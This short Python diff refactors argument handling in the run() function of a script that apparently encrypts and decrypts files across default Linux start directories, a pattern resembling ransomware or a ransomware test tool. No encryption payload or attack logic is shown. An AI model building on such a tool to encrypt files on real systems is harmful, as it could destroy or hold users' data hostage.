@@ -271,8 +271,8 @@ def decrypt_files(key, start_dirs):
                 print("File changed from " + file + " to " + file_original)
 
 
-def run(absolute_paths, encrypt):
-    if absolute_paths != 'None':
+def run(encrypt, absolute_paths=None):
+    if absolute_paths is not None and type(absolute_paths) == str:
         start_dirs = absolute_paths.split(",")
     else:
         start_dirs = LINUX_STARTDIRS
@@ -334,7 +334,7 @@ def main():
     # decrypt = args.decrypt
     absolute_paths = str(args.path)
 
-    run(absolute_paths, encrypt)
+    run(encrypt, absolute_paths)
 
 
 if __name__ == "__main__":
